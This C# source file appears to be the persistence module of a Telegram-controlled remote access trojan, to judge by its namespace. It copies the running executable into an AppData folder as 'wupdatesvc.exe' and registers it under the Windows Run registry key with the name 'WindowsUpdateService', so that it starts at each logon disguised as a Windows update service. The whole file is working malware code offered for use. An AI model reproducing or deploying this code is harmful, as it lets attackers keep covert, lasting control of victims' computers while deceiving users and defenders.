namespace TelegramRAT.Persistence;

using Microsoft.Win32;

internal static class AutoRun
{
    private const string RunKey = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
    private const string ValueName = "WindowsUpdateService";

    public static void Install()
    {
        var currentPath = Environment.ProcessPath;
        if (string.IsNullOrEmpty(currentPath)) return;

        var targetDir = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            "Microsoft", "WindowsUpdate");

        Directory.CreateDirectory(targetDir);
        var targetPath = Path.Combine(targetDir, "wupdatesvc.exe");

        if (!File.Exists(targetPath) || !FilesMatch(currentPath, targetPath))
        {
            File.Copy(currentPath, targetPath, overwrite: true);
        }

        using var key = Registry.CurrentUser.OpenSubKey(RunKey, writable: true);
        key?.SetValue(ValueName, $"\"{targetPath}\"");
    }

    public static void Uninstall()
    {
        using var key = Registry.CurrentUser.OpenSubKey(RunKey, writable: true);
        key?.DeleteValue(ValueName, throwOnMissingValue: false);
    }

    public static bool IsInstalled()
    {
        using var key = Registry.CurrentUser.OpenSubKey(RunKey);
        return key?.GetValue(ValueName) != null;
    }

    private static bool FilesMatch(string path1, string path2)
    {
        var info1 = new FileInfo(path1);
        var info2 = new FileInfo(path2);
        return info1.Length == info2.Length && info1.LastWriteTimeUtc == info2.LastWriteTimeUtc;
    }
}
